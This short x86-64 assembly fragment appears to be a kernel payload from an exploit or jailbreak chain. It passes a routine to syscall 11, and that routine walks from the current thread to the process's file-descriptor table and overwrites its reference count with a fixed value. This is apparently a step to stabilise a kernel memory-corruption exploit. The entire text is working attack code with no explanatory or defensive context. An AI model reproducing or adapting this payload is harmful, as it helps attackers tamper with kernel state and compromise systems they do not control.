use64
lea rdi, [rel unanchor]
mov rax, 11
syscall
ret
unanchor:
mov rax, [gs:0] ; struct thread
mov rax, [rax+8] ; struct proc
mov rax, [rax+0x48] ; struct filedesc
mov word [rax+66], 179 ; fd_refcnt
ret
